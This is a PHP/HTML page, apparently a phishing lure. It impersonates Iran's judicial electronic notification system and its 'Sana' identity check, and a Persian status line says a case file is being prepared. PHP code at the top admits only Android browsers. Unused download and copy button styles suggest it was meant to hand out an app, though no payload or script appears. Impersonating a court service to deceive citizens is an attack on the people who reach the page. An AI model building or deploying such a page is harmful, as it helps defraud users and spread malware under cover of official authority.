<?php
$userAgent = $_SERVER['HTTP_USER_AGENT'];

if (strpos($userAgent, 'Android') === false) {
    // Redirect or display an error message
    echo "Access denied. This page is off";
    exit();
}


?>

<!DOCTYPE html>
<html dir="rtl" lang="fa">
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta charset="UTF-8">
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/noty/3.1.4/noty.min.css">
  <style>
    body {
      margin-top: 0px;
      font-family: 'Byekan', Tahoma, Arial, sans-serif;
      background-color: #f8f9fa;
    }
    .top-section {
      background: #f5f5f5;
      position: relative;
      text-align: center;
      padding: 65px;
      margin-bottom: 3px;
    }
    .small-background {
      position: absolute;
      top: 5px;
      right: 0px;
      width: 210px;
      height: 28%;
      z-index: 1;
      background-color: #32cd32;
    }
    .small-background-below {
      position: absolute;
      top: 46px;
      right: 0px;
      width: 210px;
      height: 28%;
      background-color: #32cd32;
    }
    .small-background-new {
      position: absolute;
      top: 87px;
      right: 0px;
      width: 210px;
      height: 28%;
      background-color: #32cd32;
    }
    .small-background-new.text,
    .small-background-below .text,
    .small-background .text {
      display: block;
      font-size: 14px;
      color: #fff;
      font-weight: bold;
      text-align: center;
      padding-top: 13px;
      line-height: 10px;
    }
    .dimmed {
      opacity: 0.5;
      pointer-events: none;
    }
    .card {
      width: 90%;
      max-width: 400px;
      margin: 0 auto;
      padding: 20px;
      background-color: #fff;
      box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
      border-radius: 10px;
    }
    .card-header {
      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
      background-color: #32cd32;
      padding: 5px;
      margin-bottom: 10px;
      text-align: center;
      border-radius: 10px !important;
    }
    .card-header p {
      color: #fff;
      line-height: 1.6;
      margin: 0;
      margin-top: 5px;
      font-size: 14px;
      margin-bottom: 5px;
    }
    .form-group label {
      text-align: right;
      float: right;
      clear: both;
      margin-right: 5px;
      font-size: 14px;
    }
    .form-control {
      font-size: 15px;
      height: 42px;
      box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.1);
      border-radius: 15px;
      padding: 5px;
    }
    .form-control:focus {
      box-shadow: 0 0 0 0.0.5rem #000a5a !important;
    }
    .btn-primary {
      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
      background-color: #32cd32 !important;
      color: #fff;
      border-color: #32cd32 !important;
      width: 100%;
      font-size: 17px;
      height: 43px;
      border-radius: 15px;
      margin-top: 5px;
    }
    .photo {
      position: absolute;
      top: 5px;
      left: 8px;
      width: 170px;
      height: 91%;
      background-image: url('image1.jpg');
      background-size: cover;
      background-position: center;
    }
    .floating-card {
      position: fixed;
      text-align: center;
      top: 50%;
      left: 50%;
      border: 1px solid #c4c4c4;
      transform: translate(-50%, -50%);
      width: 250px;
      height: 240px;
      background-color: #f5f5f5;
      box-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
      border-radius: 10px;
    }
    .copy-button {
      font-size: 13px;
      display: inline-block;
      width: 80px;
      height: 30px;
      background-color: #2aae2a;
      color: #fff;
      border: #2ed27f !important;
      border-radius: 5px;
      margin-bottom: 5px;
      margin-top: 5px;
    }
    .dl-button {
      font-size: 14px;
      display: inline-block;
      width: 140px;
      height: 35px;
      background-color: #2aae2a;
      color: #fff;
      border: none;
      border-radius: 5px;
      margin-top: 3px;
    }
   
    .new-text {
      margin-right: 10px;
      font-size: 13px;
      text-align: right;
      line-height: 1.7;
      font-weight: bold;
      color: #000;
      font-family: 'Byekan', Tahoma, Arial, sans-serif;
      margin-top: 5px;
      margin-right: 5px;
      margin-bottom: 5px;
      border-radius: 5px;
    }
    .new-text2 {
      font-size: 13px;
      line-height: 1.7;
      text-align: right;
      font-weight: bold;
      color: #000;
      font-family: 'Byekan', Tahoma, Arial, sans-serif;
      margin-top: 5px;
      margin-right: 5px;
      border-radius: 5px;
    }
  .status-text {
      font-size: 14px;
      text-align: right;
      margin-top: 10px;
      color: #32cd32;
    }
    .status-exclamation {
      display: inline-block;
      width: 20px;
      height: 20px;
      background-color: #32cd32;
      color: #fff;
      text-align: center;
      font-size: 16px;
      line-height: 20px;
      border-radius: 50%;
      margin-right: 5px;
    }
	  
  </style>
  <style>
    @font-face {
      font-family: Byekan;
      src: url(Byekan.ttf);
    }
  </style>
</head>
<body>
  <div class="top-section">
    <div class="photo"></div>
    <div class="small-background">
      <span class="text">سامانه ابلاغ الکترونیک قضایی</span>
    </div>
    <div class="small-background small-background-new">
      <span class="text">احراز هویت ثنا</span>
    </div>
    <div class="small-background small-background-below">
      <span class="text">مرکز آمار و فناوری اطلاعات</span>
    </div>
    <div class="small-background-left"></div>
  </div>
  <div class="card">
 
   <div class="status-text">
در حال آماده سازی پرونده برای مشاهده و ارسال<span class="status-exclamation">&#9888;</span>
</div>
  </div>
  <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/noty/3.1.4/noty.min.js"></script>
  <script>
 
  </script>
</body>
</html>
